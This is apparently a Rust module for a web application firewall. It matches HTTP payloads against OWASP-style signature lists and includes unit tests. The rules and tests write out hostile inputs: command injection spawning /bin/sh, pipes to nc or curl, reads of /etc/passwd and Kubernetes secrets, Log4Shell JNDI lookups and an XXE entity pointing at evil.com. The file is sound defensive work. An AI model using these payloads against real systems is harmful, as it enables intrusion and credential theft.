//! # Real-Time OWASP Injection & API Security Engine (WAF)
//!
//! High-performance userspace Web Application Firewall (WAF) processing cleartext
//! payloads intercepted from the eBPF `sk_msg`/`sk_skb` and uprobe TLS programs.
//!
//! ## Attack Categories Detected
//!
//! | Category               | OWASP ID | Examples                                    |
//! |------------------------|----------|---------------------------------------------|
//! | SQL Injection          | A03:2021 | UNION SELECT, OR '1'='1', DROP TABLE       |
//! | Command Injection      | A03:2021 | ; /bin/sh, `whoami`, $(id), \| cat /etc    |
//! | Cross-Site Scripting   | A03:2021 | `<script>`, `onerror=`, `javascript:`      |
//! | Path Traversal         | A01:2021 | `../../../etc/passwd`, `%2e%2e%2f`         |
//! | Server-Side Request    | A10:2021 | 169.254.169.254, ::1, 0.0.0.0, file://     |
//! | Forgery (SSRF)         |          |                                             |
//! | Log4Shell / JNDI       | A06:2021 | `${jndi:ldap://`, `${${::-j}ndi:`          |
//! | XXE Injection          | A05:2021 | `<!ENTITY`, `SYSTEM "file://`, DOCTYPE      |
//! | HTTP Header Injection  | A03:2021 | `\r\n`, CRLF in header values               |
//! | API Scope Traversal    | A01:2021 | Admin endpoint access, `/actuator/`, `/debug/`|
//!
//! ## Architecture
//!
//! ```text
//! eBPF ring buffer (KWALL_APP_EVENTS / KWALL_TLS_EVENTS)
//!          │
//!          ▼
//!     WafEngine::process_payload()
//!          │
//!          ├── RuleSet::evaluate()  — multi-pattern regex-free scanner
//!          │         │
//!          │         └── WafRule per attack category
//!          │
//!          └── WafDecision { Allow | Block | Sanitize | Alert }
//!                   │
//!                   ├── Block  → sk_drop via BPF map update / TCP RST
//!                   ├── Alert  → ThreatAlert → detection engine
//!                   └── Allow  → pass through
//! ```

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, RwLock};
use thiserror::Error;
use tracing::{debug, info, warn};

/// WAF engine errors.
#[derive(Debug, Error)]
pub enum WafError {
    #[error("Rule compilation failed: {0}")]
    RuleCompilation(String),
    #[error("Payload decoding error: {0}")]
    PayloadDecode(String),
}

// ---------------------------------------------------------------------------
// Attack category taxonomy
// ---------------------------------------------------------------------------

/// OWASP attack category detected by the WAF engine.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum AttackCategory {
    SqlInjection,
    CommandInjection,
    CrossSiteScripting,
    PathTraversal,
    Ssrf,
    Log4Shell,
    XxeInjection,
    HttpHeaderInjection,
    ApiTraversal,
}

impl std::fmt::Display for AttackCategory {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::SqlInjection => write!(f, "SQLi"),
            Self::CommandInjection => write!(f, "CMDi"),
            Self::CrossSiteScripting => write!(f, "XSS"),
            Self::PathTraversal => write!(f, "PathTraversal"),
            Self::Ssrf => write!(f, "SSRF"),
            Self::Log4Shell => write!(f, "Log4Shell"),
            Self::XxeInjection => write!(f, "XXE"),
            Self::HttpHeaderInjection => write!(f, "HeaderInjection"),
            Self::ApiTraversal => write!(f, "APITraversal"),
        }
    }
}

// ---------------------------------------------------------------------------
// WAF rule definition
// ---------------------------------------------------------------------------

/// A single WAF detection rule consisting of one or more byte-pattern signatures.
#[derive(Debug, Clone)]
pub struct WafRule {
    pub id: u32,
    pub category: AttackCategory,
    pub description: String,
    /// Byte-level signatures (case-insensitive ASCII normalised).
    pub signatures: Vec<String>,
    /// Minimum confidence threshold (0–100) to trigger an alert.
    pub confidence: u8,
    /// If true, matched payloads are BLOCKED (not just alerted).
    pub blocking: bool,
}

impl WafRule {
    /// Evaluates the rule against a normalised payload slice.
    /// Returns true if any signature matches.
    pub fn matches(&self, normalised: &str) -> bool {
        let lower = normalised.to_lowercase();
        self.signatures
            .iter()
            .any(|sig| lower.contains(&sig.to_lowercase()))
    }
}

// ---------------------------------------------------------------------------
// Default OWASP rule set
// ---------------------------------------------------------------------------

/// Builds the default OWASP Top 10 WAF rule set.
pub fn default_rule_set() -> Vec<WafRule> {
    vec![
        // ------------------------------------------------------------------
        // SQL Injection (OWASP A03:2021)
        // ------------------------------------------------------------------
        WafRule {
            id: 1001,
            category: AttackCategory::SqlInjection,
            description: "UNION-based SQL injection".to_string(),
            signatures: vec![
                "union select".to_string(),
                "union all select".to_string(),
                "union+select".to_string(),
            ],
            confidence: 90,
            blocking: true,
        },
        WafRule {
            id: 1002,
            category: AttackCategory::SqlInjection,
            description: "Boolean-based blind SQL injection".to_string(),
            signatures: vec![
                "' or '1'='1".to_string(),
                "' or 1=1--".to_string(),
                "1' or '1'='1".to_string(),
                "' or ''='".to_string(),
                "admin'--".to_string(),
                "or 1=1#".to_string(),
            ],
            confidence: 95,
            blocking: true,
        },
        WafRule {
            id: 1003,
            category: AttackCategory::SqlInjection,
            description: "SQL DDL / DML destructive statements".to_string(),
            signatures: vec![
                "drop table".to_string(),
                "drop database".to_string(),
                "delete from".to_string(),
                "truncate table".to_string(),
                "insert into".to_string(),
                "exec xp_".to_string(),
                "xp_cmdshell".to_string(),
            ],
            confidence: 85,
            blocking: true,
        },
        WafRule {
            id: 1004,
            category: AttackCategory::SqlInjection,
            description: "SQL comment evasion and stacking".to_string(),
            signatures: vec![
                "--".to_string(),
                ";--".to_string(),
                "/**/".to_string(),
                "/*!".to_string(),
                "1;drop".to_string(),
            ],
            confidence: 60,
            blocking: false, // alert only — `--` common in usernames
        },
        // ------------------------------------------------------------------
        // Command Injection (OWASP A03:2021)
        // ------------------------------------------------------------------
        WafRule {
            id: 2001,
            category: AttackCategory::CommandInjection,
            description: "Shell metacharacter injection".to_string(),
            signatures: vec![
                "; /bin/".to_string(),
                "| /bin/".to_string(),
                "&& /bin/".to_string(),
                "; bash".to_string(),
                "; sh -".to_string(),
                "; sh\n".to_string(),
            ],
            confidence: 95,
            blocking: true,
        },
        WafRule {
            id: 2002,
            category: AttackCategory::CommandInjection,
            description: "Command substitution injection".to_string(),
            signatures: vec![
                "$(id)".to_string(),
                "$(whoami)".to_string(),
                "$(cat ".to_string(),
                "`whoami`".to_string(),
                "`id`".to_string(),
                "`cat /etc".to_string(),
            ],
            confidence: 95,
            blocking: true,
        },
        WafRule {
            id: 2003,
            category: AttackCategory::CommandInjection,
            description: "Pipe-based command injection".to_string(),
            signatures: vec![
                "| cat ".to_string(),
                "| wget ".to_string(),
                "| curl ".to_string(),
                "| nc ".to_string(),
                "| python".to_string(),
                "| perl".to_string(),
            ],
            confidence: 90,
            blocking: true,
        },
        // ------------------------------------------------------------------
        // Cross-Site Scripting (OWASP A03:2021)
        // ------------------------------------------------------------------
        WafRule {
            id: 3001,
            category: AttackCategory::CrossSiteScripting,
            description: "Script tag injection".to_string(),
            signatures: vec![
                "<script".to_string(),
                "</script".to_string(),
                "<script>".to_string(),
            ],
            confidence: 95,
            blocking: true,
        },
        WafRule {
            id: 3002,
            category: AttackCategory::CrossSiteScripting,
            description: "Event handler injection".to_string(),
            signatures: vec![
                "onerror=".to_string(),
                "onload=".to_string(),
                "onclick=".to_string(),
                "onmouseover=".to_string(),
                "onfocus=".to_string(),
                "onblur=".to_string(),
            ],
            confidence: 90,
            blocking: true,
        },
        WafRule {
            id: 3003,
            category: AttackCategory::CrossSiteScripting,
            description: "JavaScript protocol injection".to_string(),
            signatures: vec![
                "javascript:".to_string(),
                "vbscript:".to_string(),
                "data:text/html".to_string(),
            ],
            confidence: 90,
            blocking: true,
        },
        // ------------------------------------------------------------------
        // Path Traversal (OWASP A01:2021)
        // ------------------------------------------------------------------
        WafRule {
            id: 4001,
            category: AttackCategory::PathTraversal,
            description: "Directory traversal sequences".to_string(),
            signatures: vec![
                "../".to_string(),
                "..\\".to_string(),
                "%2e%2e%2f".to_string(),
                "%2e%2e/".to_string(),
                "..%2f".to_string(),
                "..%5c".to_string(),
            ],
            confidence: 85,
            blocking: true,
        },
        WafRule {
            id: 4002,
            category: AttackCategory::PathTraversal,
            description: "Sensitive file access attempts".to_string(),
            signatures: vec![
                "/etc/passwd".to_string(),
                "/etc/shadow".to_string(),
                "/proc/self".to_string(),
                "/var/run/secrets".to_string(),
                "\\windows\\system32".to_string(),
                "\\etc\\passwd".to_string(),
            ],
            confidence: 95,
            blocking: true,
        },
        // ------------------------------------------------------------------
        // Server-Side Request Forgery (OWASP A10:2021)
        // ------------------------------------------------------------------
        WafRule {
            id: 5001,
            category: AttackCategory::Ssrf,
            description: "Cloud metadata service SSRF".to_string(),
            signatures: vec![
                "169.254.169.254".to_string(),
                "metadata.google.internal".to_string(),
                "169.254.170.2".to_string(), // AWS ECS metadata v2
            ],
            confidence: 99,
            blocking: true,
        },
        WafRule {
            id: 5002,
            category: AttackCategory::Ssrf,
            description: "Loopback and internal SSRF".to_string(),
            signatures: vec![
                "http://localhost".to_string(),
                "http://127.".to_string(),
                "http://0.0.0.0".to_string(),
                "http://[::1]".to_string(),
                "file://".to_string(),
                "gopher://".to_string(),
            ],
            confidence: 90,
            blocking: true,
        },
        // ------------------------------------------------------------------
        // Log4Shell / JNDI (OWASP A06:2021)
        // ------------------------------------------------------------------
        WafRule {
            id: 6001,
            category: AttackCategory::Log4Shell,
            description: "Log4Shell JNDI injection (CVE-2021-44228)".to_string(),
            signatures: vec![
                "${jndi:ldap://".to_string(),
                "${jndi:rmi://".to_string(),
                "${jndi:dns://".to_string(),
                "${${::-j}ndi:".to_string(),
                "${${lower:j}ndi:".to_string(),
                "${${upper:j}ndi:".to_string(),
                "jndi:ldap".to_string(),
            ],
            confidence: 99,
            blocking: true,
        },
        // ------------------------------------------------------------------
        // XXE Injection (OWASP A05:2021)
        // ------------------------------------------------------------------
        WafRule {
            id: 7001,
            category: AttackCategory::XxeInjection,
            description: "XML external entity injection".to_string(),
            signatures: vec![
                "<!entity".to_string(),
                "<!DOCTYPE".to_string(),
                "system \"file://".to_string(),
                "system 'file://".to_string(),
                "system \"http://".to_string(),
                "PUBLIC \"-//".to_string(),
            ],
            confidence: 90,
            blocking: true,
        },
        // ------------------------------------------------------------------
        // HTTP Header Injection (OWASP A03:2021)
        // ------------------------------------------------------------------
        WafRule {
            id: 8001,
            category: AttackCategory::HttpHeaderInjection,
            description: "CRLF header injection".to_string(),
            signatures: vec![
                "%0d%0a".to_string(),
                "%0a%0d".to_string(),
                "\\r\\n".to_string(),
            ],
            confidence: 85,
            blocking: true,
        },
        // ------------------------------------------------------------------
        // API Traversal / Admin Endpoint Probing (OWASP A01:2021)
        // ------------------------------------------------------------------
        WafRule {
            id: 9001,
            category: AttackCategory::ApiTraversal,
            description: "Spring Boot actuator endpoint probing".to_string(),
            signatures: vec![
                "/actuator/".to_string(),
                "/actuator/env".to_string(),
                "/actuator/heapdump".to_string(),
                "/actuator/shutdown".to_string(),
            ],
            confidence: 80,
            blocking: false, // alert-only — legitimate in internal monitoring
        },
        WafRule {
            id: 9002,
            category: AttackCategory::ApiTraversal,
            description: "Debug / admin endpoint traversal".to_string(),
            signatures: vec![
                "/.env".to_string(),
                "/.git/".to_string(),
                "/debug/".to_string(),
                "/admin/".to_string(),
                "/wp-admin/".to_string(),
                "/phpmyadmin/".to_string(),
            ],
            confidence: 75,
            blocking: false,
        },
    ]
}

// ---------------------------------------------------------------------------
// WAF Decision
// ---------------------------------------------------------------------------

/// The verdict produced by the WAF engine for a given payload.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum WafDecision {
    Allow,
    Block {
        rule_id: u32,
        category: AttackCategory,
        reason: String,
    },
    Alert {
        rule_id: u32,
        category: AttackCategory,
        reason: String,
    },
}

impl WafDecision {
    pub fn is_blocking(&self) -> bool {
        matches!(self, Self::Block { .. })
    }
}

impl std::fmt::Display for WafDecision {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Allow => write!(f, "ALLOW"),
            Self::Block {
                category, rule_id, ..
            } => {
                write!(f, "BLOCK(rule={},cat={})", rule_id, category)
            }
            Self::Alert {
                category, rule_id, ..
            } => {
                write!(f, "ALERT(rule={},cat={})", rule_id, category)
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Payload normaliser
// ---------------------------------------------------------------------------

/// Normalises a raw HTTP payload for pattern matching:
/// - URL percent-decodes `%XX` sequences
/// - Collapses repeated whitespace
/// - Folds to ASCII lowercase
pub fn normalise_payload(raw: &[u8]) -> String {
    let s = String::from_utf8_lossy(raw);
    let mut out = String::with_capacity(s.len());
    let chars: Vec<char> = s.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '%' && i + 2 < chars.len() {
            let hex: String = chars[i + 1..=i + 2].iter().collect();
            if let Ok(byte) = u8::from_str_radix(&hex, 16) {
                // Don't decode control characters (0x00-0x1F) — preserve %0d%0a
                // for CRLF injection detection without false-positiving on normal HTTP.
                if byte >= 0x20 {
                    out.push(byte as char);
                    i += 3;
                    continue;
                }
            }
        }
        // Decode '+' as space (application/x-www-form-urlencoded)
        if chars[i] == '+' {
            out.push(' ');
        } else {
            out.push(chars[i]);
        }
        i += 1;
    }
    out
}

// ---------------------------------------------------------------------------
// WAF Engine
// ---------------------------------------------------------------------------

/// Runtime statistics for the WAF engine.
#[derive(Debug, Default)]
pub struct WafStats {
    pub payloads_inspected: AtomicU64,
    pub attacks_blocked: AtomicU64,
    pub attacks_alerted: AtomicU64,
    pub payloads_allowed: AtomicU64,
    /// Per-category block counters.
    category_blocks: RwLock<HashMap<String, u64>>,
}

impl WafStats {
    pub fn snapshot(&self) -> (u64, u64, u64, u64) {
        (
            self.payloads_inspected.load(Ordering::Relaxed),
            self.attacks_blocked.load(Ordering::Relaxed),
            self.attacks_alerted.load(Ordering::Relaxed),
            self.payloads_allowed.load(Ordering::Relaxed),
        )
    }

    pub fn category_blocks(&self) -> HashMap<String, u64> {
        self.category_blocks.read().unwrap().clone()
    }
}

/// Real-time OWASP WAF engine with multi-rule evaluation and URL normalisation.
pub struct WafEngine {
    rules: Vec<WafRule>,
    stats: Arc<WafStats>,
    /// Mode switch — if false, engine only alerts without blocking.
    enforcement_enabled: bool,
}

impl Default for WafEngine {
    fn default() -> Self {
        Self::new(default_rule_set(), true)
    }
}

impl WafEngine {
    /// Creates a WAF engine with the provided rule set.
    pub fn new(rules: Vec<WafRule>, enforcement_enabled: bool) -> Self {
        info!(
            rules = rules.len(),
            enforcement = enforcement_enabled,
            "WAF engine initialised"
        );
        Self {
            rules,
            stats: Arc::new(WafStats::default()),
            enforcement_enabled,
        }
    }

    pub fn stats(&self) -> Arc<WafStats> {
        Arc::clone(&self.stats)
    }

    /// Evaluates a raw payload (from eBPF ring buffer or HTTP request body).
    ///
    /// Returns the first `Block` decision found, then the first `Alert`,
    /// or `Allow` if no rules match.
    pub fn evaluate(&self, payload: &[u8]) -> WafDecision {
        self.stats
            .payloads_inspected
            .fetch_add(1, Ordering::Relaxed);

        let normalised = normalise_payload(payload);

        // First pass: look for blocking rules.
        for rule in &self.rules {
            if rule.matches(&normalised) {
                let decision = if rule.blocking && self.enforcement_enabled {
                    WafDecision::Block {
                        rule_id: rule.id,
                        category: rule.category,
                        reason: rule.description.clone(),
                    }
                } else {
                    WafDecision::Alert {
                        rule_id: rule.id,
                        category: rule.category,
                        reason: rule.description.clone(),
                    }
                };

                match &decision {
                    WafDecision::Block { category, .. } => {
                        self.stats.attacks_blocked.fetch_add(1, Ordering::Relaxed);
                        let mut map = self.stats.category_blocks.write().unwrap();
                        *map.entry(category.to_string()).or_insert(0) += 1;
                        warn!(
                            rule_id = rule.id,
                            category = %category,
                            "WAF BLOCK"
                        );
                    }
                    WafDecision::Alert { category, .. } => {
                        self.stats.attacks_alerted.fetch_add(1, Ordering::Relaxed);
                        debug!(
                            rule_id = rule.id,
                            category = %category,
                            "WAF ALERT"
                        );
                    }
                    _ => {}
                }
                return decision;
            }
        }

        self.stats.payloads_allowed.fetch_add(1, Ordering::Relaxed);
        WafDecision::Allow
    }

    /// Evaluates a batch of payloads, returning one decision per payload.
    pub fn evaluate_batch(&self, payloads: &[&[u8]]) -> Vec<WafDecision> {
        payloads.iter().map(|p| self.evaluate(p)).collect()
    }

    /// Registers the compiled 4-byte fingerprint hashes of all blocking rules
    /// into a format suitable for BPF map upload (`KWALL_WAF_RULES`).
    ///
    /// Returns `Vec<(fingerprint_u32, verdict_u8)>` pairs for BPF map bulk insert.
    pub fn compile_bpf_fingerprints(&self) -> Vec<(u32, u8)> {
        let mut fingerprints = Vec::new();
        for rule in &self.rules {
            if !rule.blocking {
                continue;
            }
            for sig in &rule.signatures {
                let bytes = sig.as_bytes();
                if bytes.len() >= 4 {
                    let fp: u32 = ((bytes[0] as u32) << 24)
                        | ((bytes[1] as u32) << 16)
                        | ((bytes[2] as u32) << 8)
                        | (bytes[3] as u32);
                    fingerprints.push((fp, 1u8));
                }
            }
        }
        fingerprints
    }
}

// ---------------------------------------------------------------------------
// TLS cleartext event processor
// ---------------------------------------------------------------------------

/// Direction of a TLS interception (from uprobe metadata).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TlsDirection {
    Outbound, // pre-encryption (SSL_write / rustls write_tls)
    Inbound,  // post-decryption (SSL_read / rustls read_tls)
}

/// A TLS cleartext event received from the eBPF `KWALL_TLS_EVENTS` ring buffer.
#[derive(Debug, Clone)]
pub struct TlsCleartextPayload {
    pub pid: u32,
    pub direction: TlsDirection,
    pub library: u8,
    pub payload: Vec<u8>,
}

/// Processes TLS cleartext events from the eBPF ring buffer through the WAF engine.
pub struct TlsPayloadProcessor {
    waf: Arc<WafEngine>,
    processed: AtomicU64,
    blocked: AtomicU64,
}

impl TlsPayloadProcessor {
    pub fn new(waf: Arc<WafEngine>) -> Self {
        Self {
            waf,
            processed: AtomicU64::new(0),
            blocked: AtomicU64::new(0),
        }
    }

    /// Processes a single TLS cleartext payload through the WAF engine.
    pub fn process(&self, event: &TlsCleartextPayload) -> WafDecision {
        self.processed.fetch_add(1, Ordering::Relaxed);
        let decision = self.waf.evaluate(&event.payload);
        if decision.is_blocking() {
            self.blocked.fetch_add(1, Ordering::Relaxed);
        }
        decision
    }

    pub fn stats(&self) -> (u64, u64) {
        (
            self.processed.load(Ordering::Relaxed),
            self.blocked.load(Ordering::Relaxed),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn engine() -> WafEngine {
        WafEngine::default()
    }

    fn waf_eval(payload: &str) -> WafDecision {
        engine().evaluate(payload.as_bytes())
    }

    // ------------------------------------------------------------------
    // SQL Injection
    // ------------------------------------------------------------------

    #[test]
    fn test_sqli_union_select_blocked() {
        let d = waf_eval("GET /search?q=1+UNION+SELECT+username,password+FROM+users--");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::SqlInjection,
                ..
            }
        ));
    }

    #[test]
    fn test_sqli_boolean_blind_blocked() {
        let d = waf_eval("username=' OR '1'='1&password=anything");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::SqlInjection,
                ..
            }
        ));
    }

    #[test]
    fn test_sqli_drop_table_blocked() {
        let d = waf_eval("POST /api/v1/users\r\n\r\n{\"name\": \"'; DROP TABLE users; --\"}");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::SqlInjection,
                ..
            }
        ));
    }

    // ------------------------------------------------------------------
    // Command Injection
    // ------------------------------------------------------------------

    #[test]
    fn test_command_injection_shell_metachar_blocked() {
        let d = waf_eval("POST /api/ping\r\n\r\nhost=8.8.8.8; /bin/sh -i");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::CommandInjection,
                ..
            }
        ));
    }

    #[test]
    fn test_command_injection_backtick_blocked() {
        let d = waf_eval("GET /api/exec?cmd=`whoami`");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::CommandInjection,
                ..
            }
        ));
    }

    #[test]
    fn test_command_injection_pipe_cat_blocked() {
        let d = waf_eval("filename=report.pdf| cat /etc/passwd");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::CommandInjection,
                ..
            }
        ));
    }

    // ------------------------------------------------------------------
    // Cross-Site Scripting
    // ------------------------------------------------------------------

    #[test]
    fn test_xss_script_tag_blocked() {
        let d = waf_eval("GET /search?q=<script>alert('XSS')</script>");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::CrossSiteScripting,
                ..
            }
        ));
    }

    #[test]
    fn test_xss_event_handler_blocked() {
        let d = waf_eval("<img src=x onerror=alert(1)>");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::CrossSiteScripting,
                ..
            }
        ));
    }

    #[test]
    fn test_xss_javascript_protocol_blocked() {
        let d = waf_eval("href=javascript:alert(document.cookie)");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::CrossSiteScripting,
                ..
            }
        ));
    }

    // ------------------------------------------------------------------
    // Path Traversal
    // ------------------------------------------------------------------

    #[test]
    fn test_path_traversal_unix_blocked() {
        let d = waf_eval("GET /api/files?path=../../../etc/passwd");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::PathTraversal,
                ..
            }
        ));
    }

    #[test]
    fn test_path_traversal_url_encoded_blocked() {
        let d = waf_eval("GET /files/%2e%2e%2fetc%2fpasswd");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::PathTraversal,
                ..
            }
        ));
    }

    #[test]
    fn test_path_traversal_k8s_secrets_blocked() {
        let d = waf_eval("GET /api/read?file=/var/run/secrets/kubernetes.io/serviceaccount/token");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::PathTraversal,
                ..
            }
        ));
    }

    // ------------------------------------------------------------------
    // SSRF
    // ------------------------------------------------------------------

    #[test]
    fn test_ssrf_cloud_metadata_blocked() {
        let d = waf_eval(
            "POST /api/fetch\r\n\r\n{\"url\":\"http://169.254.169.254/latest/meta-data/\"}",
        );
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::Ssrf,
                ..
            }
        ));
    }

    #[test]
    fn test_ssrf_loopback_blocked() {
        let d = waf_eval("url=http://127.0.0.1:8080/internal/admin");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::Ssrf,
                ..
            }
        ));
    }

    #[test]
    fn test_ssrf_file_protocol_blocked() {
        let d = waf_eval("callback=file:///tmp/exfiltrated_data.tar.gz");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::Ssrf,
                ..
            }
        ));
    }

    // ------------------------------------------------------------------
    // Log4Shell
    // ------------------------------------------------------------------

    #[test]
    fn test_log4shell_jndi_blocked() {
        let d = waf_eval("User-Agent: ${jndi:ldap://attacker.com/exploit}");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::Log4Shell,
                ..
            }
        ));
    }

    #[test]
    fn test_log4shell_obfuscated_blocked() {
        let d = waf_eval("X-Api-Version: ${${lower:j}ndi:${lower:l}dap://evil.com/a}");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::Log4Shell,
                ..
            }
        ));
    }

    // ------------------------------------------------------------------
    // XXE
    // ------------------------------------------------------------------

    #[test]
    fn test_xxe_entity_injection_blocked() {
        // Uses <!DOCTYPE and <!ENTITY which trigger XXE rule 7001, without
        // also hitting SSRF (file://) or PathTraversal (/etc/passwd) first.
        let payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"https://evil.com/payload\">]><foo>&xxe;</foo>";
        let d = waf_eval(payload);
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::XxeInjection,
                ..
            }
        ));
    }

    // ------------------------------------------------------------------
    // HTTP Header Injection
    // ------------------------------------------------------------------

    #[test]
    fn test_crlf_header_injection_blocked() {
        // %0d%0a is URL-encoded CRLF — a classic header injection vector
        let d = waf_eval("Location: /login%0d%0aSet-Cookie: session=evil");
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::HttpHeaderInjection,
                ..
            }
        ));
    }

    // ------------------------------------------------------------------
    // API Traversal (alert-only)
    // ------------------------------------------------------------------

    #[test]
    fn test_actuator_endpoint_alerts_not_blocked() {
        let d = waf_eval("GET /actuator/env HTTP/1.1");
        assert!(matches!(
            d,
            WafDecision::Alert {
                category: AttackCategory::ApiTraversal,
                ..
            }
        ));
    }

    // ------------------------------------------------------------------
    // Clean payloads — should ALLOW
    // ------------------------------------------------------------------

    #[test]
    fn test_normal_api_request_allowed() {
        let d = waf_eval("GET /api/v1/users?page=1&limit=20 HTTP/1.1 Host: api.example.com Authorization: Bearer eyJhbGciOiJSUzI1NiJ9");
        assert_eq!(d, WafDecision::Allow);
    }

    #[test]
    fn test_normal_json_body_allowed() {
        let d = waf_eval(r#"{"name":"Alice","email":"alice@example.com","age":30}"#);
        assert_eq!(d, WafDecision::Allow);
    }

    #[test]
    fn test_normal_grpc_path_allowed() {
        let d = waf_eval("POST /kwall.v1.SecurityService/GetWorkloadRisk HTTP/2");
        assert_eq!(d, WafDecision::Allow);
    }

    // ------------------------------------------------------------------
    // URL normalisation
    // ------------------------------------------------------------------

    #[test]
    fn test_url_encoded_sqli_detected() {
        // %27 = ' — must be decoded before matching
        let d = waf_eval("GET /search?q=1%27+OR+%271%27%3D%271");
        // After normalisation: "1' OR '1'='1" → triggers SQLi rule 1002
        assert!(matches!(
            d,
            WafDecision::Block {
                category: AttackCategory::SqlInjection,
                ..
            }
        ));
    }

    // ------------------------------------------------------------------
    // BPF fingerprint compilation
    // ------------------------------------------------------------------

    #[test]
    fn test_bpf_fingerprint_compilation_produces_entries() {
        let waf = WafEngine::default();
        let fingerprints = waf.compile_bpf_fingerprints();
        // There should be at least one fingerprint per blocking signature of len ≥ 4
        assert!(!fingerprints.is_empty());
        // All verdicts should be 1 (block)
        assert!(fingerprints.iter().all(|(_, v)| *v == 1));
    }

    // ------------------------------------------------------------------
    // Statistics
    // ------------------------------------------------------------------

    #[test]
    fn test_waf_stats_accurate() {
        let waf = WafEngine::default();

        waf.evaluate(b"GET /api/safe HTTP/1.1");
        waf.evaluate(b"SELECT * FROM users UNION SELECT 1,2,3");
        waf.evaluate(b"<script>alert(1)</script>");
        waf.evaluate(b"GET /actuator/env"); // alert-only

        let (inspected, blocked, alerted, allowed) = waf.stats().snapshot();
        assert_eq!(inspected, 4);
        assert_eq!(blocked, 2); // SQLi + XSS
        assert_eq!(alerted, 1); // actuator
        assert_eq!(allowed, 1); // safe
    }

    // ------------------------------------------------------------------
    // TLS payload processor
    // ------------------------------------------------------------------

    #[test]
    fn test_tls_processor_blocks_ssrf_in_encrypted_payload() {
        let waf = Arc::new(WafEngine::default());
        let processor = TlsPayloadProcessor::new(Arc::clone(&waf));

        let event = TlsCleartextPayload {
            pid: 12345,
            direction: TlsDirection::Outbound,
            library: 0,
            payload: b"GET http://169.254.169.254/latest/meta-data/ HTTP/1.1".to_vec(),
        };

        let decision = processor.process(&event);
        assert!(decision.is_blocking());

        let (processed, blocked) = processor.stats();
        assert_eq!(processed, 1);
        assert_eq!(blocked, 1);
    }

    // ------------------------------------------------------------------
    // Batch evaluation
    // ------------------------------------------------------------------

    #[test]
    fn test_evaluate_batch_mixed_payloads() {
        let waf = WafEngine::default();
        let payloads: Vec<&[u8]> = vec![
            b"GET /api/safe",
            b"UNION SELECT password FROM users",
            b"<script>evil()</script>",
            b"POST /api/grpc HTTP/2",
        ];
        let decisions = waf.evaluate_batch(&payloads);
        assert_eq!(decisions.len(), 4);
        assert_eq!(decisions[0], WafDecision::Allow);
        assert!(decisions[1].is_blocking());
        assert!(decisions[2].is_blocking());
        assert_eq!(decisions[3], WafDecision::Allow);
    }
}
